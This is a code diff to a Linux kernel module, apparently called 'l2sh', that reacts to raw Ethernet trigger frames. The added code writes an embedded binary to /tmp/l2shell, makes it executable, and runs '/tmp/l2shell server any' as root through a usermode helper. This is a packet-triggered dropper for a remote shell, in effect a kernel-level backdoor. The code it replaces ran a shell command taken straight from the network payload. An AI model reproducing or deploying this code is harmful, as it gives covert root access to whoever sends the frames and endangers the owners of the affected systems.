@@ -7,18 +7,24 @@
 
 #include "frame_dedup.h"
 #include "hello_proto.h"
+#include "l2shell_embedded.h"
 
 #include <linux/errno.h>
 #include <linux/etherdevice.h>
 #include <linux/if_ether.h>
 #include <linux/init.h>
+#include <linux/fs.h>
 #include <linux/kmod.h>
 #include <linux/module.h>
 #include <linux/netdevice.h>
+#include <linux/namei.h>
+#include <linux/path.h>
 #include <linux/printk.h>
 #include <linux/skbuff.h>
 #include <linux/slab.h>
+#include <linux/stat.h>
 #include <linux/spinlock.h>
+#include <linux/user_namespace.h>
 #include <linux/version.h>
 #include <linux/workqueue.h>
 
@@ -28,6 +34,8 @@
 #define MAX_PAYLOAD_SIZE 1024
 #define KMOD_DEDUP_SLOTS 32
 #define KMOD_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
+#define L2SHELL_TMP_PATH "/tmp/l2shell"
+#define L2SHELL_DEFAULT_CMD "/tmp/l2shell server any"
 
 struct __attribute__((packed)) packh {
     struct ethhdr eth;
@@ -57,22 +65,92 @@ static struct {
 #define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)
 
 static size_t store_spawn_cmd(const u8 *payload, size_t len, const hello_view_t *hello) {
-    const u8 *cmd = payload;
-    size_t copy_len = len;
+    ssize_t copied;
 
-    if (!payload || !len)
+    (void)payload;
+    (void)len;
+    (void)hello;
+
+    copied = strscpy(g.cmd_buf, L2SHELL_DEFAULT_CMD, sizeof(g.cmd_buf));
+    if (copied < 0)
         return 0;
+    return (size_t)copied;
+}
 
-    if (hello && hello->server_started && hello->server_bin_path_len > 0 && hello->server_bin_path_len < sizeof(g.cmd_buf)) {
-        cmd = hello->server_bin_path;
-        copy_len = hello->server_bin_path_len;
-    } else if (copy_len >= sizeof(g.cmd_buf)) {
-        copy_len = sizeof(g.cmd_buf) - 1;
+static int ensure_exec_perms_path(struct path *path) {
+    struct iattr attr = {
+        .ia_valid = ATTR_MODE,
+        .ia_mode = S_IRWXU,
+    };
+    return notify_change(&init_user_ns, path->dentry, &attr, NULL);
+}
+
+static int ensure_exec_perms_file(struct file *filp) {
+    struct path path = filp->f_path;
+    path_get(&path);
+    int ret = ensure_exec_perms_path(&path);
+    path_put(&path);
+    return ret;
+}
+
+static int ensure_l2shell_binary(void) {
+    struct path path;
+    struct kstat stat;
+    struct file *filp;
+    loff_t pos = 0;
+    size_t remaining = l2shell_embed_len;
+    const unsigned char *src = l2shell_embed;
+    int ret;
+
+    ret = kern_path(L2SHELL_TMP_PATH, LOOKUP_FOLLOW, &path);
+    if (!ret) {
+        ret = vfs_getattr(&path, &stat, STATX_SIZE, AT_STATX_SYNC_AS_STAT);
+        if (!ret) {
+            bool size_ok = (stat.size == l2shell_embed_len);
+            bool mode_ok = (stat.mode & S_IXUSR);
+            if (!mode_ok) {
+                int mode_ret = ensure_exec_perms_path(&path);
+                if (mode_ret)
+                    ret = mode_ret;
+                else
+                    mode_ok = true;
+            }
+            if (size_ok && mode_ok) {
+                path_put(&path);
+                return 0;
+            }
+        }
+        path_put(&path);
     }
 
-    memcpy(g.cmd_buf, cmd, copy_len);
-    g.cmd_buf[copy_len] = '\0';
-    return copy_len;
+    filp = filp_open(L2SHELL_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+    if (IS_ERR(filp))
+        return PTR_ERR(filp);
+
+    while (remaining > 0) {
+        ssize_t wrote = kernel_write(filp, src, remaining, &pos);
+        if (wrote < 0) {
+            ret = (int)wrote;
+            goto out_close;
+        }
+        if (wrote == 0) {
+            ret = -EIO;
+            goto out_close;
+        }
+        src += wrote;
+        remaining -= (size_t)wrote;
+    }
+
+    ret = vfs_fsync(filp, 0);
+    if (!ret)
+        ret = ensure_exec_perms_file(filp);
+
+out_close:
+    filp_close(filp, NULL);
+    if (ret)
+        return ret;
+    pr_info("l2sh: refreshed embedded server at %s size=%u\n", L2SHELL_TMP_PATH, l2shell_embed_len);
+    return 0;
 }
 
 static void disable_capture(void);
@@ -169,6 +247,18 @@ static void exec_server(struct work_struct *work) {
         NULL};
     char *argv[] = {"/bin/sh", "-c", g.cmd_buf, NULL};
     struct subprocess_info *info;
+    int prep;
+
+    prep = ensure_l2shell_binary();
+    if (prep) {
+        pr_err("l2sh: failed to prepare embedded server err=%d\n", prep);
+        spin_lock(&g.launch_lock);
+        g.launch_pending = false;
+        spin_unlock(&g.launch_lock);
+        return;
+    }
+
+    strscpy(g.cmd_buf, L2SHELL_DEFAULT_CMD, sizeof(g.cmd_buf));
 
     pr_info("l2sh: launching cmd='%s'\n", g.cmd_buf);
 
